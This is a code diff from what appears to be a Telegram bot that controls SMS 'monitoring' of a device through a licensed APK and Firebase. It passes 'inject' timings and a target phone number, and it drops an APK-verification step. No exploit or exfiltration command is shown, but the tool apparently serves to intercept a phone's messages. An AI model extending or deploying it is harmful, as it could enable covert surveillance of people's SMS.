@@ -146,10 +146,17 @@ async def _deliver_monitoring_started(
     *,
     message_id: int | None = None,
     reply_func=None,
+    inject_total_ms: int = 15,
 ) -> None:
+    queued_ms = max(1, inject_total_ms - 2)
     monitoring_card = format_monitoring_card(device, profile, ignored_sms=ignored)
-    startup_card = format_virtus_startup_card()
-    stream_card = format_virtus_stream_card(STARTUP_TEST_SENDER, STARTUP_TEST_MESSAGE)
+    startup_card = format_virtus_startup_card(queued_ms=queued_ms, total_ms=inject_total_ms)
+    stream_card = format_virtus_stream_card(
+        STARTUP_TEST_SENDER,
+        STARTUP_TEST_MESSAGE,
+        queued_ms=queued_ms,
+        total_ms=inject_total_ms + 5,
+    )
     keyboard = monitoring_keyboard(device)
 
     if message_id is not None and reply_func:
@@ -330,10 +337,18 @@ async def _prepare_monitoring(
     profile: MonitorProfile,
     device: Device,
 ) -> None:
+    from app.firebase_sync import resolve_firebase_url
     from app.license_keys import ensure_ready_for_monitoring
 
     license_key = require_license_key(profile)
-    await ensure_ready_for_monitoring(license_key, device.name, user_id)
+    firebase_url = resolve_firebase_url(profile, device)
+    await ensure_ready_for_monitoring(
+        license_key,
+        device.name,
+        user_id,
+        target_number=profile.phone_number,
+        firebase_url=firebase_url,
+    )
     await sync_profile_to_firebase(profile, device)
 
 
@@ -343,6 +358,7 @@ async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYP
         return
 
     db: Session = SessionLocal()
+    inject_total_ms = 15
     try:
         profile = get_monitor_profile(db, user.id)
         device = get_active_device(db, user.id)
@@ -352,7 +368,7 @@ async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYP
         profile, device = start_monitoring(db, user.id)
         ignored = count_old_sms(db, device.id, profile.started_at)
         await sync_profile_to_firebase(profile, device)
-        await send_polling_startup_test(db, profile, device)
+        _, inject_total_ms = await send_polling_startup_test(db, profile, device)
     except ValueError as exc:
         message = str(exc)
         if "channel" in message.lower():
@@ -375,6 +391,7 @@ async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYP
         device,
         ignored,
         reply_func=update.message.reply_text,
+        inject_total_ms=inject_total_ms or 15,
     )
     schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)
 
@@ -818,6 +835,7 @@ async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 
     db: Session = SessionLocal()
     ignored = 0
+    inject_total_ms = 15
     try:
         profile = get_monitor_profile(db, user.id)
         device = get_active_device(db, user.id)
@@ -826,7 +844,7 @@ async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         profile, device = resume_monitoring(db, user.id)
         if device:
             await sync_profile_to_firebase(profile, device)
-            await send_polling_startup_test(db, profile, device)
+            _, inject_total_ms = await send_polling_startup_test(db, profile, device)
             ignored = count_old_sms(db, device.id, profile.started_at) if profile.started_at else 0
     except ValueError as exc:
         await update.message.reply_text(f"❌ {exc}")
@@ -842,6 +860,7 @@ async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             device,
             ignored,
             reply_func=update.message.reply_text,
+            inject_total_ms=inject_total_ms or 15,
         )
         schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)
     else:
@@ -1058,43 +1077,12 @@ async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
         )
         return
 
-    if action == "confirm":
-        db: Session = SessionLocal()
-        try:
-            profile = get_monitor_profile(db, user.id)
-            device = get_active_device(db, user.id)
-            if not profile:
-                await update.message.reply_text("❌ <code>/key generate</code>", parse_mode="HTML")
-                return
-            license_key = require_license_key(profile)
-            if not device:
-                await update.message.reply_text("❌ <code>/fdy &lt;device_id&gt;</code>", parse_mode="HTML")
-                return
-
-            from app.license_keys import publish_license_key, verify_apk_for_device
-
-            await publish_license_key(
-                license_key,
-                device_id=device.name,
-                firebase_bases=[profile.firebase_url] if profile.firebase_url else None,
-            )
-            await sync_profile_to_firebase(profile, device)
-            attached, apk_device_id = await verify_apk_for_device(
-                license_key,
-                device.name,
-                user.id,
-            )
-        finally:
-            db.close()
-        if attached:
-            await update.message.reply_text(
-                "✅ <b>APK VERIFIED</b>\n\n"
-                f"🔑 <code>{license_key}</code>\n"
-                f"📱 <code>{apk_device_id or device.name}</code>",
-                parse_mode="HTML",
-            )
-        else:
-            await update.message.reply_text("❌ APK verify fail — /guide", parse_mode="HTML")
+    if action in {"confirm", "keyconfirm"}:
+        await update.message.reply_text(
+            "✅ <b>KEY OK</b>\n"
+            "<pre>APK + bot same KEY → /startmonitor\n/key confirm ki zaroorat nahi.</pre>",
+            parse_mode="HTML",
+        )
         return
 
     if action == "status" and len(context.args) >= 2:
@@ -1331,7 +1319,7 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
 async def _activate_monitoring(
     db: Session,
     user_id: int,
-) -> tuple[MonitorProfile, Device, int]:
+) -> tuple[MonitorProfile, Device, int, int]:
     profile = get_monitor_profile(db, user_id)
     device = get_active_device(db, user_id)
     if not profile or not device:
@@ -1341,8 +1329,8 @@ async def _activate_monitoring(
     profile, device = start_monitoring(db, user_id)
     ignored = count_old_sms(db, device.id, profile.started_at)
     await sync_profile_to_firebase(profile, device)
-    await send_polling_startup_test(db, profile, device)
-    return profile, device, ignored
+    _, inject_total_ms = await send_polling_startup_test(db, profile, device)
+    return profile, device, ignored, inject_total_ms
 
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1390,7 +1378,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
         if data.startswith("monitor:start:"):
             try:
-                profile, device, ignored = await _activate_monitoring(db, user.id)
+                profile, device, ignored, inject_total_ms = await _activate_monitoring(db, user.id)
             except ValueError as exc:
                 message = str(exc)
                 if "select sim" in message.lower():
@@ -1413,6 +1401,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
                 ignored,
                 message_id=query.message.message_id,
                 reply_func=query.edit_message_text,
+                inject_total_ms=inject_total_ms or 15,
             )
             schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)
             return
